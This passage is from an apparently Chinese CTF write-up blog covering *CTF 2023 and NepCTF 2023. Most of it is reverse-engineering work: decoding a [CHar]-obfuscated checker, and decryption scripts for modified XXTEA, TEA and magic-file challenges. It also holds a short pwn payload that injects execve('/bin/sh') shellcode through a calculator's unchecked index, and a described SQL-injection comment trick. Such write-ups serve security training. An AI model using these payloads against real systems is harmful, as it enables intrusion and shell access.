ar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]118+[CHar]91+[CHar]112+[CHar]93+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]121+[CHar]32+[CHar]61+[CHar]32+[CHar]99+[CHar]95+[CHar]117+[CHar]105+[CHar]110+[CHar]116+[CHar]51+[CHar]50+[CHar]40+[CHar]118+[CHar]91+[CHar]48+[CHar]93+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]118+[CHar]91+[CHar]110+[CHar]45+[CHar]49+[CHar]93+[CHar]32+[CHar]61+[CHar]32+[CHar]99+[CHar]95+[CHar]117+[CHar]105+[CHar]110+[CHar]116+[CHar]51+[CHar]50+[CHar]40+[CHar]118+[CHar]91+[CHar]110+[CHar]45+[CHar]49+[CHar]93+[CHar]32+[CHar]43+[CHar]32+[CHar]77+[CHar]88+[CHar]40+[CHar]122+[CHar]44+[CHar]32+[CHar]121+[CHar]44+[CHar]32+[CHar]116+[CHar]111+[CHar]116+[CHar]97+[CHar]108+[CHar]44+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]107+[CHar]101+[CHar]121+[CHar]44+[CHar]32+[CHar]110+[CHar]45+[CHar]49+[CHar]44+[CHar]32+[CHar]101+[CHar]41+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]41+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]122+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]118+[CHar]91+[CHar]110+[CHar]45+[CHar]49+[CHar]93+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]114+[CHar]111+[CHar]117+[CHar]110+[CHar]100+[CHar]115+[CHar]32+[CHar]45+[CHar]61+[CHar]32+[CHar]49+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]114+[CHar]101+[CHar]116+[CHar]117+[CHar]114+[CHar]110+[CHar]32+[CHar]118+[CHar]10+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]100+[CHar]101+[CHar]102+[CHar]32+[CHar]98+[CHar]121+[CHar]116+[CHar]101+[CHar]115+[CHar]50+[CHar]105+[CHar]110+[CHar]116+[CHar]115+[CHar]40+[CHar]115+[CHar]101+[CHar]108+[CHar]102+[CHar]44+[CHar]99+[CHar]115+[CHar]58+[CHar]98+[CHar]121+[CHar]116+[CHar]101+[CHar]115+[CHar]41+[CHar]45+[CHar]62+[CHar]108+[CHar]105+[CHar]115+[CHar]116+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]110+[CHar]101+[CHar]119+[CHar]95+[CHar]108+[CHar]101+[CHar]110+[CHar]103+[CHar]116+[CHar]104+[CHar]61+[CHar]108+[CHar]101+[CHar]110+[CHar]40+[CHar]99+[CHar]115+[CHar]41+[CHar]43+[CHar]40+[CHar]56+[CHar]45+[CHar]108+[CHar]101+[CHar]110+[CHar]40+[CHar]99+[CHar]115+[CHar]41+[CHar]37+[CHar]56+[CHar]41+[CHar]37+[CHar]56+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]98+[CHar]97+[CHar]114+[CHar]114+[CHar]97+[CHar]121+[CHar]61+[CHar]99+[CHar]115+[CHar]46+[CHar]108+[CHar]106+[CHar]117+[CHar]115+[CHar]116+[CHar]40+[CHar]110+[CHar]101+[CHar]119+[CHar]95+[CHar]108+[CHar]101+[CHar]110+[CHar]103+[CHar]116+[CHar]104+[CHar]44+[CHar]98+[CHar]39+[CHar]92+[CHar]120+[CHar]48+[CHar]48+[CHar]39+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]105+[CHar]61+[CHar]48+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]118+[CHar]61+[CHar]91+[CHar]93+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]119+[CHar]104+[CHar]105+[CHar]108+[CHar]101+[CHar]32+[CHar]105+[CHar]32+[CHar]60+[CHar]32+[CHar]110+[CHar]101+[CHar]119+[CHar]95+[CHar]108+[CHar]101+[CHar]110+[CHar]103+[CHar]116+[CHar]104+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]118+[CHar]48+[CHar]32+[CHar]61+[CHar]32+[CHar]105+[CHar]110+[CHar]116+[CHar]46+[CHar]102+[CHar]114+[CHar]111+[CHar]109+[CHar]95+[CHar]98+[CHar]121+[CHar]116+[CHar]101+[CHar]115+[CHar]40+[CHar]98+[CHar]97+[CHar]114+[CHar]114+[CHar]97+[CHar]121+[CHar]91+[CHar]105+[CHar]58+[CHar]105+[CHar]43+[CHar]52+[CHar]93+[CHar]44+[CHar]32+[CHar]39+[CHar]108+[CHar]105+[CHar]116+[CHar]116+[CHar]108+[CHar]101+[CHar]39+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]118+[CHar]49+[CHar]32+[CHar]61+[CHar]32+[CHar]105+[CHar]110+[CHar]116+[CHar]46+[CHar]102+[CHar]114+[CHar]111+[CHar]109+[CHar]95+[CHar]98+[CHar]121+[CHar]116+[CHar]101+[CHar]115+[CHar]40+[CHar]98+[CHar]97+[CHar]114+[CHar]114+[CHar]97+[CHar]121+[CHar]91+[CHar]105+[CHar]43+[CHar]52+[CHar]58+[CHar]105+[CHar]43+[CHar]56+[CHar]93+[CHar]44+[CHar]32+[CHar]39+[CHar]108+[CHar]105+[CHar]116+[CHar]116+[CHar]108+[CHar]101+[CHar]39+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]118+[CHar]46+[CHar]97+[CHar]112+[CHar]112+[CHar]101+[CHar]110+[CHar]100+[CHar]40+[CHar]118+[CHar]48+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]118+[CHar]46+[CHar]97+[CHar]112+[CHar]112+[CHar]101+[CHar]110+[CHar]100+[CHar]40+[CHar]118+[CHar]49+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]105+[CHar]32+[CHar]43+[CHar]61+[CHar]32+[CHar]56+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]114+[CHar]101+[CHar]116+[CHar]117+[CHar]114+[CHar]110+[CHar]32+[CHar]118+[CHar]10+[CHar]10+[CHar]100+[CHar]101+[CHar]102+[CHar]32+[CHar]99+[CHar]104+[CHar]101+[CHar]99+[CHar]107+[CHar]40+[CHar]105+[CHar]110+[CHar]115+[CHar]116+[CHar]114+[CHar]58+[CHar]115+[CHar]116+[CHar]114+[CHar]44+[CHar]99+[CHar]104+[CHar]101+[CHar]99+[CHar]107+[CHar]108+[CHar]105+[CHar]115+[CHar]116+[CHar]58+[CHar]108+[CHar]105+[CHar]115+[CHar]116+[CHar]41+[CHar]45+[CHar]62+[CHar]105+[CHar]110+[CHar]116+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]108+[CHar]101+[CHar]110+[CHar]103+[CHar]116+[CHar]104+[CHar]61+[CHar]108+[CHar]101+[CHar]110+[CHar]40+[CHar]105+[CHar]110+[CHar]115+[CHar]116+[CHar]114+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]105+[CHar]102+[CHar]32+[CHar]108+[CHar]101+[CHar]110+[CHar]103+[CHar]116+[CHar]104+[CHar]37+[CHar]56+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]112+[CHar]114+[CHar]105+[CHar]110+[CHar]116+[CHar]40+[CHar]34+[CHar]73+[CHar]110+[CHar]99+[CHar]111+[CHar]114+[CHar]114+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]102+[CHar]111+[CHar]114+[CHar]109+[CHar]97+[CHar]116+[CHar]46+[CHar]34+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]101+[CHar]120+[CHar]105+[CHar]116+[CHar]40+[CHar]49+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]99+[CHar]61+[CHar]99+[CHar]104+[CHar]105+[CHar]112+[CHar]101+[CHar]114+[CHar]40+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]118+[CHar]32+[CHar]61+[CHar]32+[CHar]99+[CHar]46+[CHar]98+[CHar]121+[CHar]116+[CHar]101+[CHar]115+[CHar]50+[CHar]105+[CHar]110+[CHar]116+[CHar]115+[CHar]40+[CHar]105+[CHar]110+[CHar]115+[CHar]116+[CHar]114+[CHar]46+[CHar]101+[CHar]110+[CHar]99+[CHar]111+[CHar]100+[CHar]101+[CHar]40+[CHar]41+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]111+[CHar]117+[CHar]116+[CHar]112+[CHar]117+[CHar]116+[CHar]61+[CHar]108+[CHar]105+[CHar]115+[CHar]116+[CHar]40+[CHar]99+[CHar]46+[CHar]101+[CHar]40+[CHar]108+[CHar]101+[CHar]110+[CHar]40+[CHar]118+[CHar]41+[CHar]44+[CHar]118+[CHar]41+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]105+[CHar]61+[CHar]48+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]119+[CHar]104+[CHar]105+[CHar]108+[CHar]101+[CHar]40+[CHar]105+[CHar]60+[CHar]108+[CHar]101+[CHar]110+[CHar]40+[CHar]99+[CHar]104+[CHar]101+[CHar]99+[CHar]107+[CHar]108+[CHar]105+[CHar]115+[CHar]116+[CHar]41+[CHar]41+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]105+[CHar]102+[CHar]32+[CHar]105+[CHar]60+[CHar]108+[CHar]101+[CHar]110+[CHar]40+[CHar]111+[CHar]117+[CHar]116+[CHar]112+[CHar]117+[CHar]116+[CHar]41+[CHar]32+[CHar]97+[CHar]110+[CHar]100+[CHar]32+[CHar]111+[CHar]117+[CHar]116+[CHar]112+[CHar]117+[CHar]116+[CHar]91+[CHar]105+[CHar]93+[CHar]61+[CHar]61+[CHar]99+[CHar]104+[CHar]101+[CHar]99+[CHar]107+[CHar]108+[CHar]105+[CHar]115+[CHar]116+[CHar]91+[CHar]105+[CHar]93+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]105+[CHar]43+[CHar]61+[CHar]49+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]101+[CHar]108+[CHar]115+[CHar]101+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]98+[CHar]114+[CHar]101+[CHar]97+[CHar]107+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]105+[CHar]102+[CHar]32+[CHar]105+[CHar]61+[CHar]61+[CHar]108+[CHar]101+[CHar]110+[CHar]40+[CHar]99+[CHar]104+[CHar]101+[CHar]99+[CHar]107+[CHar]108+[CHar]105+[CHar]115+[CHar]116+[CHar]41+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]114+[CHar]101+[CHar]116+[CHar]117+[CHar]114+[CHar]110+[CHar]32+[CHar]49+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]114+[CHar]101+[CHar]116+[CHar]117+[CHar]114+[CHar]110+[CHar]32+[CHar]48+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]10+[CHar]10+[CHar]105+[CHar]102+[CHar]32+[CHar]95+[CHar]95+[CHar]110+[CHar]97+[CHar]109+[CHar]101+[CHar]95+[CHar]95+[CHar]61+[CHar]61+[CHar]34+[CHar]95+[CHar]95+[CHar]109+[CHar]97+[CHar]105+[CHar]110+[CHar]95+[CHar]95+[CHar]34+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]97+[CHar]110+[CHar]115+[CHar]61+[CHar]91+[CHar]49+[CHar]51+[CHar]55+[CHar]52+[CHar]50+[CHar]55+[CHar]56+[CHar]56+[CHar]52+[CHar]50+[CHar]44+[CHar]32+[CHar]50+[CHar]49+[CHar]51+[CHar]54+[CHar]48+[CHar]48+[CHar]54+[CHar]53+[CHar]52+[CHar]48+[CHar]44+[CHar]32+[CHar]52+[CHar]49+[CHar]57+[CHar]49+[CHar]48+[CHar]53+[CHar]54+[CHar]56+[CHar]49+[CHar]53+[CHar]44+[CHar]32+[CHar]51+[CHar]50+[CHar]52+[CHar]56+[CHar]56+[CHar]56+[CHar]49+[CHar]51+[CHar]55+[CHar]54+[CHar]93+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]35+[CHar]32+[CHar]103+[CHar]101+[CHar]110+[CHar]101+[CHar]114+[CHar]97+[CHar]116+[CHar]101+[CHar]82+[CHar]101+[CHar]115+[CHar]40+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]102+[CHar]108+[CHar]97+[CHar]103+[CHar]61+[CHar]105+[CHar]110+[CHar]112+[CHar]117+[CHar]116+[CHar]40+[CHar]39+[CHar]80+[CHar]108+[CHar]101+[CHar]97+[CHar]115+[CHar]101+[CHar]32+[CHar]105+[CHar]110+[CHar]112+[CHar]117+[CHar]116+[CHar]32+[CHar]102+[CHar]108+[CHar]97+[CHar]103+[CHar]58+[CHar]39+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]114+[CHar]101+[CHar]115+[CHar]61+[CHar]99+[CHar]104+[CHar]101+[CHar]99+[CHar]107+[CHar]40+[CHar]102+[CHar]108+[CHar]97+[CHar]103+[CHar]44+[CHar]97+[CHar]110+[CHar]115+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]105+[CHar]102+[CHar]32+[CHar]114+[CHar]101+[CHar]115+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]112+[CHar]114+[CHar]105+[CHar]110+[CHar]116+[CHar]40+[CHar]34+[CHar]67+[CHar]111+[CHar]110+[CHar]103+[CHar]114+[CHar]97+[CHar]116+[CHar]117+[CHar]108+[CHar]97+[CHar]116+[CHar]105+[CHar]111+[CHar]110+[CHar]115+[CHar]44+[CHar]32+[CHar]121+[CHar]111+[CHar]117+[CHar]39+[CHar]118+[CHar]101+[CHar]32+[CHar]103+[CHar]111+[CHar]116+[CHar]32+[CHar]116+[CHar]104+[CHar]101+[CHar]32+[CHar]102+[CHar]108+[CHar]97+[CHar]103+[CHar]33+[CHar]34+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]112+[CHar]114+[CHar]105+[CHar]110+[CHar]116+[CHar]40+[CHar]34+[CHar]70+[CHar]108+[CHar]97+[CHar]103+[CHar]32+[CHar]105+[CHar]115+[CHar]32+[CHar]42+[CHar]99+[CHar]116+[CHar]102+[CHar]123+[CHar]121+[CHar]111+[CHar]117+[CHar]114+[CHar]95+[CHar]105+[CHar]110+[CHar]112+[CHar]117+[CHar]116+[CHar]125+[CHar]33+[CHar]34+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]101+[CHar]120+[CHar]105+[CHar]116+[CHar]40+[CHar]48+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]101+[CHar]108+[CHar]115+[CHar]101+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]112+[CHar]114+[CHar]105+[CHar]110+[CHar]116+[CHar]40+[CHar]39+[CHar]78+[CHar]111+[CHar]112+[CHar]101+[CHar]44+[CHar]116+[CHar]114+[CHar]121+[CHar]32+[CHar]97+[CHar]103+[CHar]97+[CHar]105+[CHar]110+[CHar]33+[CHar]39+[CHar]41 简单解析一下 12345678with open(\"./output\", \"r\") as f: out=f.read()res=out.split(\"+\")print(len(res))for i in res: tmp=i[6:] print(chr(int(tmp)),end=\"\") 真正执行的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081class chiper(): def __init__(self): self.d = 0x87654321 k0 = 0x67452301 k1 = 0xefcdab89 k2 = 0x98badcfe k3 = 0x10325476 self.k = [k0, k1, k2, k3] def e(self, n, v): from ctypes import c_uint32 def MX(z, y, total, key, p, e): temp1 = (z.value &gt;&gt; 6 ^ y.value &lt;&lt; 4) + \\ (y.value &gt;&gt; 2 ^ z.value &lt;&lt; 5) temp2 = (total.value ^ y.value) + \\ (key[(p &amp; 3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2) key = self.k delta = self.d rounds = 6 + 52//n total = c_uint32(0) z = c_uint32(v[n-1]) e = c_uint32(0) while rounds &gt; 0: total.value += delta e.value = (total.value &gt;&gt; 2) &amp; 3 for p in range(n-1): y = c_uint32(v[p+1]) v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value z.value = v[p] y = c_uint32(v[0]) v[n-1] = c_uint32(v[n-1] + MX(z, y, total, key, n-1, e).value).value z.value = v[n-1] rounds -= 1 return v def bytes2ints(self,cs:bytes)-&gt;list: new_length=len(cs)+(8-len(cs)%8)%8 barray=cs.ljust(new_length,b'\\x00') i=0 v=[] while i &lt; new_length: v0 = int.from_bytes(barray[i:i+4], 'little') v1 = int.from_bytes(barray[i+4:i+8], 'little') v.append(v0) v.append(v1) i += 8 return vdef check(instr:str,checklist:list)-&gt;int: length=len(instr) if length%8: print(\"Incorrect format.\") exit(1) c=chiper() v = c.bytes2ints(instr.encode()) output=list(c.e(len(v),v)) i=0 while(i&lt;len(checklist)): if i&lt;len(output) and output[i]==checklist[i]: i+=1 else: break if i==len(checklist): return 1 return 0 if __name__==\"__main__\": ans=[1374278842, 2136006540, 4191056815, 3248881376] # generateRes() flag=input('Please input flag:') res=check(flag,ans) if res: print(\"Congratulations, you've got the flag!\") print(\"Flag is *ctf{your_input}!\") exit(0) else: print('Nope,try again!') 魔改的xxtea，改了delta和MX，简单修改一下就可以，解密脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #define DELTA 0x87654321 #define MX (((z&gt;&gt;6^y&lt;&lt;4) + (y&gt;&gt;2^z&lt;&lt;5)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } int main() { uint32_t v[4]= {1374278842, 2136006540, 4191056815, 3248881376}; uint32_t const k[4]= {0x67452301,0xefcdab89,0x98badcfe,0x10325476}; int n= 4; btea(v, -n, k); printf(\"%08x, %08x, %08x, %08x\\n\",v[0],v[1],v[2],v[3]); return 0; } flagfile挺有意思的一道题目，用magic file对flag进行检验，正确有输出。尝试写一些magic file编译之后和给出的flag.mgc进行对比，大致可以看出每一行实际执行的功能。总的来说除了格式上flag{*}的匹配以外，只有两种运算 123&gt;0x40 leshort^0xA =0xB&gt;(0x40.b) byte^0xA =0xB 第一种表示对0x40位置的偏移进行计算，由此可以得到0x40-0x7E位置上的值。第二种是相对偏移，取出0x40位置上的一个byte，这个byte的值就是文件偏移，然后对该偏移处的byte进行计算。 计算都是异或，非常好还原，解析给出的flag.mgc然后计算得到flag 123456789101112131415161718192021222324s=[0 for _ in range(32)]with open(\"./flag.mgc\",\"rb\") as f: mgc=f.read()p1=mgc[0x2F0:0x31F0]idx=0for i in range(0,len(p1),0x178): tmp=p1[i:i+0x178] # print(hex(tmp[0x18]),hex(tmp[0x20])) s[idx]=tmp[0x18]^tmp[0x20] idx+=1print(s)p2=mgc[0x31f0:0x60F0]flag=[0 for _ in range(38)]idx=0for i in range(0,len(p2),0x178): tmp=p2[i:i+0x178] # print(hex(tmp[0x18]),hex(tmp[0x20])) flag[s[idx]]=tmp[0x18]^tmp[0x20] idx+=1print(flag)print(\"\".join([chr(i) for i in flag])) PwnFcalc浮点数计算器，要求输入的所有数据都是1.0-100.0之间的浮点数，可以使用+-*/四种运算，但是在判断时对调用函数的索引没有进行严格限制，导致可以通过输入0执行shellcode。此外，还有一个buf overflow，可以覆盖已经读入内存的浮点数值。 最大的难点在于shellcode必须满足1.0-100.0之间的浮点数这一要求，构造起来难度很大，所以使了个讨巧的办法，对一个浮点数，替换头两位为jmp $-x，跳转到不需要检查的输入执行，这种替换不太会影响浮点数的值，只会在小数点后几位产生影响。 payload如下 12sl(\"1.1 1.2\")s(b\"0\" + b\" \" * 0x1F + execve_bin_sh.ljust(0x20, b\"\\x90\") + p64(0x3FF199999999CEEB) * 3)","link":"/2023/07/31/starctf-2023/"},{"title":"nepctf-2023","text":"主要做了re，难度不小，可惜后面的题目没时间看了 misccodesmain函数第三个变量就是环境变量，逐个输出就可以 与AI共舞的哈夫曼直接用gpt照着写一个 123456789101112131415161718192021222324252627282930313233def decompress(input_file, output_file): with open(input_file, 'rb') as f: # Read frequency information num_symbols = f.read(1)[0] frequencies = {} for _ in range(num_symbols): byte = f.read(1)[0] freq_bytes = f.read(4) freq = (freq_bytes[0] &lt;&lt; 24) | (freq_bytes[1] &lt;&lt; 16) | (freq_bytes[2] &lt;&lt; 8) | freq_bytes[3] frequencies[byte] = freq # Rebuild Huffman tree root = build_huffman_tree(frequencies) # Read compressed data compressed_data = f.read() current_node = root decompressed_data = bytearray() for bit in compressed_data: for i in range(7, -1, -1): bit_value = (bit &gt;&gt; i) &amp; 1 if bit_value == 0: current_node = current_node.left else: current_node = current_node.right if current_node.char is not None: decompressed_data.append(current_node.char) current_node = root with open(output_file, 'wb') as f: f.write(decompressed_data) ConnectedFive送分，下赢就行 PwnHRP-CHAT-1SQL注入，注册的用户里带'-- ，查询的时候会把后面的语句注释掉，绕过statement查询，输出flag HRP-CHAT-3Roll出来H3，然后用技能1，相加溢出为负，得到flag RE九龙拉棺flag分成了两段，程序里的tea解出来只有前半段。 程序中有一段数据经过RC4+base32+base58+base64之后，得到了一个dll，其中包含了另一段tea加密过程，两段解出来去重拼一起。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;iostream&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;// 加密函数void encrypt(uint32_t *v, uint32_t *k) { uint32_t v0 = v[0], v1 = v[1], sum = 0, i; /* set up */ uint32_t delta = 0x9e3779b9; /* a key schedule constant */ uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */ for (i = 0; i &lt; 32; i++) { /* basic cycle start */ sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); } /* end cycle */ v[0] = v0; v[1] = v1;}// 解密函数void decrypt(uint32_t *v, uint32_t *k) { uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; /* set up */ uint32_t delta = 0x9e3779b9; /* a key schedule constant */ uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */ for (i = 0; i &lt; 32; i++) { /* basic cycle start */ v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; } /* end cycle */ v[0] = v0; v[1] = v1;}int main() { unsigned int v12[16]; v12[0] = 0x88AFD2D6; v12[1] = 0x3FBE45A7; v12[2] = 0x27AAD1B9; v12[3] = 0x8CB3E51E; v12[4] = 0x9348FFA; v12[5] = 0xE19F3C42; v12[6] = 0xFFDD0D86; v12[7] = 0xEDB97383; v12[8] = 0x12C4C0BF; v12[9] = 0x1B67BD19; v12[10] = 0xF7A514D6; v12[11] = 0x18F95254; v12[12] = 0xAB100CB0; v12[13] = 0xCBA137; v12[14] = 0x2A91712; v12[15] = 0xC58D0D9E; uint32_t k[4] = {1, 2, 3, 4}; for (int c = 0; c &lt; 8; c++) { decrypt(&amp;v12[2 * c], k); for (int j = 0; j &lt; 4; j++) { printf(\"%c\", (v12[2 * c] &gt;&gt; 8 * j) &amp; 0xff); } for (int j = 0; j &lt; 4; j++) { printf(\"%c\", (v12[2 * c + 1] &gt;&gt; 8 * j) &amp; 0xff); } } unsigned int v16[16]; v16[0] = 0x1DC74989; v16[1] = 0xD979AF77; v16[2] = 0x888D136D; v16[3] = 0x8E26DB7F; v16[4] = 0xC10C3CC9; v16[5] = 0xC3845D40; v16[6] = 0xC6E04459; v16[7] = 0xA2EBDF07; v16[8] = 0xD484388D; v16[9] = 0x12F956A2; v16[10] = 0x5ED7EE59; v16[11] = 0x43137F85; v16[12] = 0xEF43F9F0; v16[13] = 0xB29683AA; v16[14] = 0x8E3640B4; v16[15] = 0xC2D36177; uint32_t k2[4] = {0x12, 0x34, 0x56, 0x78}; for (int c = 0; c &lt; 8; c++) { decrypt(&amp;v16[2 * c], k2); for (int j = 0; j &lt; 4; j++) { printf(\"%c\", (v16[2 * c] &gt;&gt; 8 * j) &amp; 0xff); } for (int j = 0; j &lt; 4; j++) { printf(\"%c\", (v16[2 * c + 1] &gt;&gt; 8 * j) &amp; 0xff); } } return 0;}// iu41m0pv3x7kllzu8pdq6mt9n2nwjdp6kat8ent4dhn5r158iz2f0cmr0u7yxyq}// NepCTF{c9cdnwdi3iu41m0pv3x7kllzu8pdq6mt9n2nwjdp6kat8ent4dhn5r158iz2f0cmr0u7yxyq} Review很多反调试，主要操作其实就是一个xxtea+取反+AES，没有魔改 xxtea之后还有一个生成AES密钥的操作，有几位跟结果中与后一位相同的个数有关，就48种可能，遍历一下就行，虽然最终结果就是0 12345678910111213from Crypto.Cipher import AESpassword = b\"\\x19\\x28\\x6E\\x04\\x19\\x28\\x6E\\x04\\x46\\x55\\xC8\\x04\\x46\\x55\\xC8\\x04\"text = 